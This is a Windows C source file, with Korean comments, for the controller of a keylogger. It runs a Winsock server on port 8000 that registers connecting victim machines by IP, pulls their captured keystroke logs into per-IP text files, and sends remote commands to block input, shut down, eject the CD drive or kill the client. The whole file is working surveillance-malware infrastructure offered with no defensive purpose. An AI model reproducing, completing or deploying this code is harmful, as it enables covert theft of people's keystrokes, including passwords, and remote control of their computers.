#pragma warning(disable:4996)

#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <tchar.h>
#include "resource.h"

#define BUF_SIZE 256
#define MYPORT 8000
#define FILE_BUF 1024
BOOL isSend = FALSE;
HWND hWndMain;
WSADATA wsaData;
HANDLE pThread;

TCHAR Listbuf[BUF_SIZE];
int numOfClntSock = 0;//소켓구조체와 이벤트 구조체 개수
int numOfIP = 0;//client구조체 개수

SOCKET hSockArr[WSA_MAXIMUM_WAIT_EVENTS];//소켓구조체
WSAEVENT hEventArr[WSA_MAXIMUM_WAIT_EVENTS];//이벤트구조체

struct Client{

	SOCKET Socket;
	TCHAR Addr[20];
	int S_Windex;//소켓 구조체의 인덱스

}Client[WSA_MAXIMUM_WAIT_EVENTS];//클라이언트 구조체

unsigned int WINAPI ConnectKeyLog(void* data);//키로거 연결함수
void CloseConnect();//연결종료함수
void SendCommand(char* com,int idx);//명령전송 함수
void Compress(int idx, int total);//소켓,이벤트 구조체정렬
void CompressAddr(int idx, int total);//클라이언트 구조체 정렬

BOOL CALLBACK MainDlgProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM IParam);

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance
	, LPSTR lpszCmdParam, int nCmdShow)
{
	
	DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG1), HWND_DESKTOP, MainDlgProc);//다이알로그 생성

	return 0;
}


BOOL CALLBACK MainDlgProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM IParam)
{
	DWORD index = 0;
	TCHAR buf[BUF_SIZE] = { 0, };
	
	switch (iMessage) {

	case WM_INITDIALOG :
	
		WSAStartup(MAKEWORD(2, 2), &wsaData);
		hWndMain = hWnd;
		
		SendDlgItemMessage(hWnd, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)TEXT("아이피 목록 갱신중...."));
		

		pThread = (HANDLE)_beginthreadex(NULL, 0, ConnectKeyLog,0, 0, 0);//통신용 스레드 생성
		return TRUE;


	case WM_COMMAND ://각종 버튼에대한 명령 처리

		switch (LOWORD(wParam)) {

		case IDC_RECV :

			index = SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETCURSEL, 0, 0);
			SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETTEXT,index,(LPARAM)buf);

			if (isSend == TRUE) {
				MessageBox(hWnd, TEXT("이미 파일을수신중입니다"), TEXT("알림"), MB_OK);
			}
			else if(_tcslen(buf) <= 0)//수정
			{
				MessageBox(hWnd, TEXT("아이피를 선택하세요"), TEXT("알림"), MB_OK);
				return FALSE;
			}
			else {
				wsprintf(Listbuf, TEXT("%s 아이피로부터 데이터를 수신중입니다.."),buf);
				SendDlgItemMessage(hWnd, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)Listbuf);
				SendCommand("get",index);
				memset(buf, 0, BUF_SIZE);
			}
			return TRUE;

		case IDC_EJECT :
			index = SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETCURSEL, 0, 0);
			SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETTEXT, index, (LPARAM)buf);
			if (_tcslen(buf) <= 0)
			{
				MessageBox(hWnd, TEXT("아이피를 선택하세요"), TEXT("알림"), MB_OK);
				return FALSE;
			}
			else {
				wsprintf(Listbuf, TEXT("%s 아이피의 시디롬을 오픈 하엿습니다."), buf);
				SendDlgItemMessage(hWnd, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)Listbuf);
				SendCommand("eject", index);
			}
			return TRUE;


		case IDC_BLOCK :

			index = SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETCURSEL, 0, 0);
			SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETTEXT, index, (LPARAM)buf);
			if (_tcslen(buf) <= 0)
			{
				MessageBox(hWnd, TEXT("아이피를 선택하세요"), TEXT("알림"), MB_OK);
				return FALSE;
			}
			else {
				wsprintf(Listbuf, TEXT("%s 아이피에게 블러킹을 하엿습니다."), buf);
				SendDlgItemMessage(hWnd, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)Listbuf);
				SendCommand("block", index);
			}
			return TRUE;

		case IDC_UNBLOCK :
			index = SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETCURSEL, 0, 0);
			SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETTEXT, index, (LPARAM)buf);
			if (_tcslen(buf) <= 0)
			{
				MessageBox(hWnd, TEXT("아이피를 선택하세요"), TEXT("알림"), MB_OK);
				return FALSE;
			}
			else {
				wsprintf(Listbuf, TEXT("%s 아이피에게 언블러킹을 하엿습니다."), buf);
				SendDlgItemMessage(hWnd, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)Listbuf);
				SendCommand("unblock", index);
			}
			return TRUE;
			
		case IDC_SHUTDOWN :

			index = SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETCURSEL, 0, 0);
			SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETTEXT, index, (LPARAM)buf);
			if (_tcslen(buf) <= 0)
			{
				MessageBox(hWnd, TEXT("아이피를 선택하세요"), TEXT("알림"), MB_OK);
				return FALSE;
			}
			else {

				
				SendCommand("shutdown", index);
				
			}
			return TRUE;

		case IDC_EXIT :

			index = SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETCURSEL, 0, 0);
			SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETTEXT, index, (LPARAM)buf);

			if (_tcslen(buf) <= 0)
			{
				MessageBox(hWnd, TEXT("아이피를 선택하세요"), TEXT("알림"), MB_OK);
				return FALSE;
			}

			else {
				
				
				SendCommand("kill",index);
				
			}
			return TRUE;

		
		case IDCANCEL :

			CloseConnect();//연결종료후
			EndDialog(hWnd, IDCANCEL);//종료
			return TRUE;

		}
		return FALSE;
	}

	return FALSE;
}

unsigned int WINAPI ConnectKeyLog(void* data)//키로거 연결 함수
{
	SOCKET hServSock, hClntSock;
	SOCKADDR_IN servAdr, clntAdr;
	WSAEVENT newEvent = NULL;
	WSANETWORKEVENTS netEvents;

	int i;
	DWORD C_index = 0;
	int posInfo, startIdx;
	int clntAdrLen;
	TCHAR FileName[BUF_SIZE];

	HANDLE hFile;
	int recvresult;
	char fbuf[FILE_BUF];
	TCHAR mBuf[BUF_SIZE];
	DWORD WriteResult;
	char* IP = NULL;

	hServSock = socket(PF_INET, SOCK_STREAM, 0);
	if(hServSock == INVALID_SOCKET)
		MessageBox(hWndMain, TEXT("socket오류"), TEXT("오류"), MB_OK);

	memset(&servAdr, 0, sizeof(servAdr));
	servAdr.sin_family = AF_INET;
	servAdr.sin_addr.s_addr = htonl(INADDR_ANY);
	servAdr.sin_port = htons(MYPORT);

	if (bind(hServSock, (SOCKADDR*)&servAdr, sizeof(servAdr)) == SOCKET_ERROR)
		MessageBox(hWndMain, TEXT("bind오류"), TEXT("오류"), MB_OK);

	if (listen(hServSock, 5) == SOCKET_ERROR)
		MessageBox(hWndMain, TEXT("listen오류"), TEXT("오류"), MB_OK);

	newEvent = WSACreateEvent();

	if (WSAEventSelect(hServSock, newEvent, FD_ACCEPT) == SOCKET_ERROR)
		MessageBox(hWndMain, TEXT("fdaccept오류"), TEXT("오류"), MB_OK);

	hSockArr[numOfClntSock] = hServSock;
	hEventArr[numOfClntSock] = newEvent;
	numOfClntSock++;
	while (1)
	{
		posInfo = WSAWaitForMultipleEvents(numOfClntSock, hEventArr, FALSE, WSA_INFINITE, FALSE);
		startIdx = posInfo - WSA_WAIT_EVENT_0;

		for (i = startIdx;i<numOfClntSock;i++)
		{
			int sigEventIdx = WSAWaitForMultipleEvents(1, &hEventArr[i], TRUE, 0, FALSE);
			if ((sigEventIdx == WSA_WAIT_FAILED || sigEventIdx == WSA_WAIT_TIMEOUT))
			{
				continue;
			}
			else {
				sigEventIdx = i;
				WSAEnumNetworkEvents(hSockArr[sigEventIdx], hEventArr[sigEventIdx], &netEvents);
				if (netEvents.lNetworkEvents & FD_ACCEPT)//키로거 접속시
				{
					if (netEvents.iErrorCode[FD_ACCEPT_BIT] != 0)
					{
						break;
					}
					clntAdrLen = sizeof(clntAdr);
					hClntSock = accept(hSockArr[sigEventIdx], (SOCKADDR*)&clntAdr, &clntAdrLen);
					newEvent = WSACreateEvent();
					WSAEventSelect(hClntSock, newEvent, FD_READ | FD_CLOSE);

					hEventArr[numOfClntSock] = newEvent;
					hSockArr[numOfClntSock] = hClntSock;
					Client[numOfIP].Socket = hClntSock;
					Client[numOfIP].S_Windex = numOfClntSock;

					IP = inet_ntoa(clntAdr.sin_addr);
					MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, IP, strlen(IP), Client[numOfClntSock].Addr,strlen(IP));
					Client[numOfClntSock].Addr[strlen(IP)] = '\0';
					SendDlgItemMessage(hWndMain, IDC_LIST1, LB_ADDSTRING, 0,(LPARAM)(Client[numOfClntSock].Addr));
					memset(mBuf, 0, BUF_SIZE);
					wsprintf(mBuf, TEXT("%s 아이피가 접속했습니다."),Client[numOfClntSock].Addr);
					SendDlgItemMessage(hWndMain, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)mBuf);
					numOfClntSock++;
					numOfIP++;


					
				}
				if (netEvents.lNetworkEvents & FD_READ)
				{
					if (netEvents.iErrorCode[FD_READ_BIT] != 0)
					{
						break;
					}
					//키로거로부터 파일받기
					wsprintf(FileName, TEXT("%s.txt"), Client[sigEventIdx].Addr);
					hFile = CreateFile(FileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
					while (1)
					{
						recvresult = recv(hSockArr[sigEventIdx], fbuf,FILE_BUF, 0);
						if (recvresult <= 0) {
							WriteFile(hFile, fbuf, recvresult, &WriteResult, NULL);
							break;
						}

						WriteFile(hFile, fbuf, recvresult, &WriteResult, NULL);
					}
					Sleep(1000);
					SendDlgItemMessage(hWndMain, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)TEXT("파일 수신을 완료하였습니다!"));
					CloseHandle(hFile);
					isSend = FALSE;

				}

				if (netEvents.lNetworkEvents & FD_CLOSE)//키로거 종료시
				{
					
					if (netEvents.iErrorCode[FD_CLOSE_BIT] != 0)
					{
						break;
					}
					
					
					for (i = 0;i < numOfIP;i++) {
						if (sigEventIdx == Client[i].S_Windex) {
							C_index = i;
							break;
	
						}
					}

					SendDlgItemMessage(hWndMain, IDC_LIST1, LB_DELETESTRING, C_index, 0);
					memset(mBuf, 0, BUF_SIZE);
					wsprintf(mBuf, TEXT("%s 아이피가 접속을 종료하였습니다"), Client[C_index].Addr);
					SendDlgItemMessage(hWndMain, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)mBuf);
					WSACloseEvent(hEventArr[sigEventIdx]);
					closesocket(hSockArr[sigEventIdx]);
					Compress(sigEventIdx, numOfClntSock);
					CompressAddr(C_index,numOfIP);
					numOfClntSock--;
					numOfIP--;

				}
			}
		}

	}
	
	return TRUE;
}


void CloseConnect()//연결종료
{
	DWORD dwResult;

	GetExitCodeThread(pThread, &dwResult);

	for (int i = 0;i < numOfClntSock;i++)
	{
		closesocket(hSockArr[i]);
		WSACloseEvent(hEventArr[i]);

	}
	CloseHandle(pThread);
	WSACleanup();

}

void SendCommand(char* com,int idx)//명령전송함수
{

		if (strncmp(com, "get", 3) == 0)
		{
			isSend = TRUE;
			send(Client[idx].Socket, "get", 3, 0);
		}
		else if (strncmp(com, "kill", 4) == 0)
		{
			send(Client[idx].Socket, "kill", 4, 0);
		}
		else if (strncmp(com, "unblock", 7) == 0)
		{
			send(Client[idx].Socket, "unblock", 7, 0);
		}
		else if (strncmp(com, "block", 5) == 0) {
			send(Client[idx].Socket, "block", 5, 0);
		}
		else if (strncmp(com, "shutdown", 8) == 0) {
			send(Client[idx].Socket, "shutdown", 8, 0);
		}
		else if (strncmp(com, "eject", 5) == 0) {
			send(Client[idx].Socket, "eject", 5, 0);
		}
		else if (strncmp(com, "uneject", 7) == 0) {
			send(Client[idx].Socket, "uneject", 7, 0);
		}

}


void Compress(int idx, int total)//소켓구조체와 이벤트 구조체 정렬
{
	int i;
	for (i = idx;i < total;i++)
	{
		hSockArr[i] = hSockArr[i + 1];
		hEventArr[i] = hEventArr[i + 1];
	}

}

void CompressAddr(int idx, int total)//클라이언트구조체 정렬
{
	int i;
	for (i = idx; i < total;i++)
		Client[i] = Client[i + 1];
}

//처음 종료시 아이피 안써지는 문제
